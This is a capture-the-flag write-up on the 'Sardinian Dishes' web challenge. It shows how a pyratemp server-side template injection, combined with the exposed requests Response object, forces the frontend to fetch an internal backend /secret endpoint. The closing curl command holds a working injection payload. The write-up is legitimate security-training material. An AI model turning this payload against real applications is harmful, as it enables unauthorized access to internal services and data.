# Sardinian Dishes

## Description

> I think that a friend of mine is using this recipe sharing website to sell illegal cheese. Can you find a way to access the forbidden recipe?
>
> And while you're there, share some of you <s>worst</s> best local recipes.
>
> [https://edition.cnn.com/travel/article/casu-marzu-worlds-most-dangerous-cheese/index.html](https://edition.cnn.com/travel/article/casu-marzu-worlds-most-dangerous-cheese/index.html)
>
> Website: [http://sardinianrecipes.challs.srdnlen.it](http://sardinianrecipes.challs.srdnlen.it)
>
> Attachments: sardiniandishes.zip

<details><summary>attached sardiniandishes.zip</summary>

```console
$ unzip -t sardiniandishes.zip
Archive:  sardiniandishes.zip
    testing: src/backend/             OK
    testing: src/backend/Dockerfile   OK
    testing: src/backend/src/         OK
    testing: src/backend/src/app.py   OK
    testing: src/backend/src/schema.sql   OK
    testing: src/frontend/            OK
    testing: src/frontend/Dockerfile   OK
    testing: src/frontend/src/        OK
    testing: src/frontend/src/app.py   OK
    testing: src/frontend/src/static/   OK
    testing: src/frontend/src/static/css/   OK
    testing: src/frontend/src/static/css/bootstrap-dark.min.css   OK
    testing: src/frontend/src/templates/   OK
    testing: src/frontend/src/templates/index.html   OK
    testing: src/frontend/src/templates/suggest.html   OK
No errors detected in compressed data of sardiniandishes.zip.
```

</details>

## Setup

```bash
sed -i -e 's/web-dish-backend/backend/' src/frontend/src/app.py
docker-compose --file src/docker-compose.yml --project-directory . up --build
```

## Solution

The web application architecture overview for this challenge is the following:

```text
client <--HTTP--> frontend(Python Flask) <--HTTP--> backend(Python Flask)
```

Looking at the attached source code.

```sql
-- src/backend/src/schema.sql
INSERT INTO illegalrecipes (name, details) VALUES ('casu marzu', 'srdnlen{REDACTED}');
```

The flag is the details column value in the illegalrecipes table in the backend DB.

In backend:

```python
# src/backend/src/app.py
@app.get('/secret')
def secret():
    cur = get_db().execute("SELECT details FROM illegalrecipes WHERE name='casu marzu'")
    recipe = cur.fetchone()
    cur.close()
    return str(recipe)

@app.get('/recipe')
def getRecipe():
    name = request.args.get('name')
    cur = get_db().execute("SELECT details FROM recipes WHERE name=?", (name,))
    recipe = cur.fetchone()
    cur.close()
    return str(recipe)
```

In frontend:

```python
# src/frontend/src/app.py
@app.route('/recipe')
def get_product():
  name = request.args.get('name')
  if name == "casu marzu":
    resp = make_response("Forbidden - CASU MARZU IS ILLEGAL, YOU CAN'T COOK IT!")
    resp.status_code = 403
    return resp
  else:
    res = requests.get(f"http://web-dish-backend:5000/recipe?name={name}")
    template = pyratemp.Template(f"The recipe for {name} is at @! res.text !@")
    return template(res=res)
```

If I can send a /secret request from the frontend to the backend, I can get the flag.
However, the client has only controllable the name query string of the /recipe endpoint in the frontend.
Additionally, it appears that the /recipe endpoint in the frontend can only make a /recipe request to the backend.
I will take a closer look to see if I can do something with the /recipe endpoint in the frontend.

```python
    template = pyratemp.Template(f"The recipe for {name} is at @! res.text !@")
    return template(res=res)
```

[pyratemp](https://pypi.org/project/pyratemp/) template engine is used.
I read [the documentation for this template engine](https://www.simple-is-better.org/template/pyratemp.html) and found that it forbids access to names beginning with `_`.
This means that I can't do like `''.__class__.__mro__[-1].blah.blah`

[simple is better - pyratemp](https://www.simple-is-better.org/template/pyratemp.html#evaluation)

> (snip) It also forbids access to names beginning with _, to prevent things like 0 .__class__, which could be used to break out of the sandbox.

Also, I use `$! ... !$` instead of `@! ... !@` for easy viewing.

> @!EXPR!@ escaped substitution: special characters are escaped
>
> $!EXPR!$ unescaped/raw substitution

Tested in my local environment:

```bash
pip3 install pyratemp
```

```python
>>> import pyratemp
>>> pyratemp.__version__
'0.3.2'
>>> template = pyratemp.Template("$! ''.__class__ !$")
Traceback (most recent call last):
(snip)
NameError: Name '__class__' is not allowed in '''.__class__'.
```

Certainly, I can't use `_`.

> dir()       [new in 0.3.1 / 0.2.4]

Looking at the documentation, I found `dir()` is available.
I see what variables can be used by using `dir()`.

```python
>>> import requests
>>> requests.__version__
'2.31.0'
>>> res = requests.get("http://example.com")
>>> template = pyratemp.Template("$! dir() !$")
>>> template(res=res)
"['res']"
```

res object - requests.Response object - is available because it is passed as an argument such as `template(res=res)`.
I see if I can send a /secret request to the backend, by using the res object.

```python
>>> from pprint import pprint
>>> pprint(dir(res))
(snip)
 'connection',
(snip)
 'request',
(snip)
>>> res.connection
<requests.adapters.HTTPAdapter object at 0x7f129c070a10>
>>> res.request
<PreparedRequest [GET]>
```

res.connection and res.request are interesting.
I see these pydoc by using `help(res.connection)` and `help(res.request)`.
I can also see the same document with `python3 -m pydoc requests.adapters.HTTPAdapter` and `python3 -m pydoc requests.PreparedRequest` command.

```text
Help on HTTPAdapter in module requests.adapters object:

class HTTPAdapter(BaseAdapter)
 |  HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=0, pool_block=False)
(snip)
 |  send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None)
 |      Sends PreparedRequest object. Returns Response object.
 |
 |      :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
 |      :param stream: (optional) Whether to stream the request content.
 |      :param timeout: (optional) How long to wait for the server to send
 |          data before giving up, as a float, or a :ref:`(connect timeout,
 |          read timeout) <timeouts>` tuple.
 |      :type timeout: float or tuple or urllib3 Timeout object
 |      :param verify: (optional) Either a boolean, in which case it controls whether
 |          we verify the server's TLS certificate, or a string, in which case it
 |          must be a path to a CA bundle to use
 |      :param cert: (optional) Any user-provided SSL certificate to be trusted.
 |      :param proxies: (optional) The proxies dictionary to apply to the request.
 |      :rtype: requests.Response
```

```text
Help on PreparedRequest in module requests.models object:

class PreparedRequest(RequestEncodingMixin, RequestHooksMixin)
(snip)
 |  prepare_url(self, url, params)
 |      Prepares the given HTTP URL.
```

PreparedRequest object can be used by res.request and the request URL can be set by the prepare_url method.
Also, HTTPAdapter object can be used by res.connection and I can send a request by the send method with PreparedRequest object.

Tested:

```python
>>> res.request.prepare_url('http://httpbin.org/status/201', {})
>>> res.connection.send(res.request).status_code
201
```

I will do the same thing for /secret on the backend.

```console
$ curl -G http://localhost/recipe --data-urlencode 'name=$! res.request.prepare_url("http://backend:5000/secret", {}) !$ $! res.connection.send(res.request).text !$"'
The recipe for None ('srdnlen{there_are_some_dirty_worms_in_my_template}',)" is at None
```

Got the flag.
